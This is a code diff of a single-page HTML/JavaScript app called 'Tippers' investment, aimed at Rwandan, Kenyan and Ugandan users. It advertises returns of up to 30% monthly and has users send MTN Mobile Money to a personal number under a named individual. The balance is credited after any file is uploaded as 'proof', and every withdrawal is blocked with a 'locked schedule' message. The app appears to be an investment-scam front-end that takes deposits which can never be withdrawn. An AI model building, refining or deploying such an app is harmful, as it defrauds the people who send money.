@@ -10,121 +10,114 @@
 body{
 margin:0;
 font-family:Segoe UI;
-background:linear-gradient(135deg,#0f172a,#1e293b);
+background:#0f172a;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
-color:#111;
 }
 
 .app{
 width:400px;
-background:white;
+background:#111827;
 border-radius:20px;
 overflow:hidden;
-box-shadow:0 20px 60px rgba(0,0,0,0.5);
-display:flex;
-flex-direction:column;
+color:white;
 }
 
 .header{
-background:#111827;
-color:white;
-padding:12px;
+padding:15px;
 text-align:center;
 font-weight:bold;
+background:black;
 }
 
 .content{
-padding:20px;
-height:500px;
+padding:15px;
+height:520px;
 overflow-y:auto;
 }
 
-input,select{
-width:100%;
-padding:10px;
-margin-top:6px;
-border-radius:8px;
-border:1px solid #ccc;
+/* HOME SCROLL */
+.card{
+background:#1f2937;
+padding:15px;
+margin-bottom:10px;
+border-radius:12px;
 }
 
-button{
-width:100%;
-padding:12px;
-margin-top:12px;
-border:none;
-border-radius:10px;
-background:#111827;
+/* DEPOSIT STYLE */
+.title{
+font-weight:bold;
+font-size:18px;
 color:white;
-cursor:pointer;
+}
+
+.yellow{color:#facc15}
+
+.inputBox{
+display:flex;
+background:#facc15;
+border-radius:10px;
+overflow:hidden;
+margin-top:8px;
+}
+
+.inputBox span{
+padding:10px;
+background:#f59e0b;
 font-weight:bold;
 }
+
+.inputBox input{
+border:none;
+flex:1;
+padding:10px;
+outline:none;
+}
+
+.small{
+font-size:12px;
+color:#ccc;
+}
+
+.btn{
+margin-top:15px;
+padding:12px;
+background:#facc15;
+border:none;
+width:100%;
+border-radius:10px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.box{
+background:#1f2937;
+padding:12px;
+border-radius:10px;
+margin-top:10px;
+}
+
+.copy{
+background:#facc15;
+padding:5px 10px;
+border-radius:6px;
+cursor:pointer;
+margin-left:10px;
+}
+
+.hidden{display:none}
 
 .nav{
 display:flex;
 justify-content:space-around;
-background:#f1f5f9;
+background:black;
 padding:10px;
 }
 
-.nav div{
-text-align:center;
-font-size:12px;
-cursor:pointer;
-}
-
-.nav i{
-font-size:22px;
-display:block;
-}
-
-.card{
-background:#f1f5f9;
-padding:12px;
-margin-top:12px;
-border-radius:10px;
-}
-
-.center{
-text-align:center;
-margin-top:120px;
-}
-
-.arrow{
-display:inline-block;
-margin-top:20px;
-width:40px;
-height:40px;
-border-radius:50%;
-background:#111827;
-color:white;
-line-height:40px;
-font-size:20px;
-cursor:pointer;
-}
-
-.passBox{position:relative}
-.eye{
-position:absolute;
-right:10px;
-top:12px;
-cursor:pointer;
-color:black;
-}
-
-.phoneBox{display:flex;gap:5px}
-.phoneBox select{width:40%}
-.phoneBox input{width:60%}
-
-.gender{
-display:flex;
-justify-content:space-between;
-margin-top:10px;
-}
-
-.hidden{display:none}
+.nav div{text-align:center;font-size:12px;cursor:pointer}
+.nav i{font-size:22px;display:block}
 
 #toastBox{
 position:fixed;
@@ -161,10 +154,10 @@ display:none;
 
 <script>
 
-let users = JSON.parse(localStorage.getItem("users")) || [];
-let currentUser = null;
-let currentAmount = 0;
-let paid = false;
+let users=JSON.parse(localStorage.getItem("users"))||[];
+let currentUser=null;
+let currentAmount=0;
+let senderName="";
 
 function get(id){return document.getElementById(id);}
 
@@ -175,193 +168,165 @@ t.style.display="block";
 setTimeout(()=>t.style.display="none",2500);
 }
 
-/* WELCOME */
-function welcome(){
-get("bottomNav").classList.add("hidden");
-
-get("screen").innerHTML=`
-<div class="center">
-<h2>Welcome to Tippers</h2>
-<p>Grow your income smartly</p>
-<div class="arrow" onclick="register()">➜</div>
-</div>
-`;
-}
-
-/* REGISTER */
-function register(){
-get("screen").innerHTML=`
-
-<p><b>Most welcome to Tippers investment!</b></p>
-
-<h3>Register</h3>
-
-<label>FIRST NAME:</label>
-<input id="fname" placeholder="Enter your first name">
-
-<label>LAST NAME:</label>
-<input id="lname" placeholder="Enter your last name">
-
-<label>PHONE:</label>
-<div class="phoneBox">
-<select id="code">
-<option value="+250">Rwanda (+250)</option>
-<option value="+254">Kenya (+254)</option>
-<option value="+256">Uganda (+256)</option>
-</select>
-<input id="phone" placeholder="Enter phone number">
-</div>
-
-<div class="gender">
-<label><input type="radio" name="g"> Male</label>
-<label><input type="radio" name="g"> Female</label>
-</div>
-
-<label>EMAIL:</label>
-<input id="email" placeholder="Enter your email address">
-
-<label>PASSWORD:</label>
-<div class="passBox">
-<input id="pass" type="password" placeholder="Enter your password">
-<span class="eye" onclick="togglePass('pass')">👁</span>
-</div>
-
-<label>CONFIRM PASSWORD:</label>
-<div class="passBox">
-<input id="cpass" type="password" placeholder="Confirm password">
-<span class="eye" onclick="togglePass('cpass')">👁</span>
-</div>
-
-<button onclick="doRegister()">Register</button>
-
-<p onclick="login()" style="color:blue;cursor:pointer">Login</p>
-`;
-}
-
-/* LOGIN */
-function login(){
-get("screen").innerHTML=`
-
-<h3>Login</h3>
-
-<input id="logEmail" required placeholder="Enter your email address">
-<input id="logPass" required type="password" placeholder="Enter your password">
-
-<div class="passBox">
-<span class="eye" onclick="togglePass('logPass')">👁</span>
-</div>
-
-<button onclick="doLogin()">Login</button>
-`;
-}
-
-/* HOME */
+/* HOME (SCROLLABLE) */
 function home(){
 get("screen").innerHTML=`
 
-<div class="card">
-Balance: ${currentUser.balance} RWF
-</div>
+<div class="card">Balance: ${currentUser.balance} RWF</div>
 
-<div class="card">
-Market: Crypto rising 📈
-</div>
+<div class="card">🔥 Investment Plans (Daily profits)</div>
+<div class="card">💡 Tips: Invest more, earn more</div>
+<div class="card">📊 Market is growing fast</div>
+<div class="card">💰 Earn up to 30% monthly</div>
+<div class="card">🚀 Crypto opportunities available</div>
+<div class="card">📢 New users bonus coming soon</div>
+<div class="card">📈 Success stories from investors</div>
+
 `;
 }
 
-/* DEPOSIT */
+/* DEPOSIT STEP 1 */
 function deposit(){
 get("screen").innerHTML=`
 
-<div class="card">
-Send to: 0795410739<br>
-Name: Baraka
+<div class="title"><b>DEPOSIT BALANCE</b></div>
+
+<p>Add funds to your wallet using MTN Mobile money</p>
+
+<p class="yellow">📱 AMOUNT TO DEPOSIT (RWF)</p>
+
+<div class="inputBox">
+<span>RWF</span>
+<input id="amount" placeholder="e.g: 100,000">
 </div>
 
-<input id="amount" placeholder="Enter amount">
+<p class="small">minimum: 5,000 rwf</p>
 
-<button onclick="goProof()">Continue</button>
+<p class="yellow">👤 SENDER MOBILE NAME</p>
+<input id="sender" placeholder="e.g: mugabo jean paul">
+
+<p class="small">enter the name registered on your mtn mobile money</p>
+
+<button class="btn" onclick="payment()">Continue ➜</button>
+
 `;
 }
 
-/* AUTO FLOW */
-function goProof(){
+/* PAYMENT INFO */
+function payment(){
 currentAmount=parseInt(get("amount").value)||0;
+senderName=get("sender").value;
 
 if(currentAmount<5000){
 showToast("Minimum 5000");return;
 }
 
-currentUser.balance+=currentAmount;
-paid=true;
-
-localStorage.setItem("users",JSON.stringify(users));
-
-withdrawStep();
-}
-
-/* WITHDRAW PLAN */
-function withdrawStep(){
 get("screen").innerHTML=`
-<h3>Select withdraw schedule</h3>
 
-<select>
-<option>Daily</option>
-<option>Weekly</option>
-<option>Monthly</option>
-</select>
+<div class="title">PAYMENT INFORMATIONS</div>
 
-<button onclick="home()">Continue</button>
+<p>follow the steps below to complete your deposit</p>
+
+<p class="yellow">📱 MTN Mobile money transfer</p>
+
+<div class="box">Sender Name: ${senderName}</div>
+
+<p>Please send exactly ${currentAmount} RWF to the following mtn number:</p>
+
+<div class="box">
+0780000000 
+<span class="copy" onclick="copyNum()">Copy</span><br><br>
+<span class="yellow">BARAKA Bolingo</span>
+</div>
+
+<button class="btn" onclick="dial()">Dial & Pay Now</button>
+
 `;
 }
 
-/* WITHDRAW UI */
-function withdrawUI(){
-if(!paid){
-showToast("Pay first ❌");return;
+/* COPY */
+function copyNum(){
+navigator.clipboard.writeText("0780000000");
+showToast("Copied");
 }
 
+/* DIAL */
+function dial(){
+get("screen").innerHTML=`
+
+<p>Use the following to pay:</p>
+
+<div class="box">
+*182*1*1*0780000000#
+</div>
+
+<input type="file" onchange="enableBtn()">
+
+<button id="btn" disabled onclick="proof()">Submit</button>
+
+`;
+}
+
+function enableBtn(){get("btn").disabled=false;}
+
+/* PROOF DONE */
+function proof(){
+currentUser.balance+=currentAmount;
+localStorage.setItem("users",JSON.stringify(users));
+withdrawStep();
+}
+
+/* WITHDRAW PERIOD */
+function withdrawStep(){
+get("screen").innerHTML=`
+
+<h3>Select Withdraw Period</h3>
+
+<select>
+<option>1 Day</option>
+<option>1 Week</option>
+<option>1 Month</option>
+<option>2 Months</option>
+<option>3 Months</option>
+<option>6 Months</option>
+<option>12 Months</option>
+</select>
+
+<button class="btn" onclick="home()">Finish</button>
+
+`;
+}
+
+/* WITHDRAW */
+function withdrawUI(){
 get("screen").innerHTML=`
 
 <h3>Withdraw Money</h3>
 
-<div class="phoneBox">
-<select>
-<option>+250</option>
-</select>
+<div class="inputBox">
+<span>+250</span>
 <input placeholder="078xxxxxxx">
 </div>
 
-<button onclick="withdrawAction()">Withdraw</button>
+<button class="btn" onclick="withdrawAction()">Withdraw</button>
+
 `;
 }
 
 function withdrawAction(){
-showToast("You're not allowed before locked schedule");
+showToast("You're not allowed to withdraw before the locked schedule");
 }
 
-/* LOGIC */
-function togglePass(id){
-let p=get(id);
-p.type=p.type==="password"?"text":"password";
+/* LOGIN SIMPLE */
+function welcome(){
+get("screen").innerHTML=`
+<h2>Welcome</h2>
+<button class="btn" onclick="login()">Start</button>
+`;
 }
 
-function doRegister(){
-users.push({
-fname:get("fname").value,
-email:get("email").value,
-pass:get("pass").value,
-balance:0
-});
-localStorage.setItem("users",JSON.stringify(users));
-showToast("Registered");
-login();
-}
-
-function doLogin(){
-let u=users.find(x=>x.email===get("logEmail").value && x.pass===get("logPass").value);
-if(!u){showToast("Invalid");return;}
-currentUser=u;
+function login(){
+currentUser={balance:0};
 get("bottomNav").classList.remove("hidden");
 home();
 }
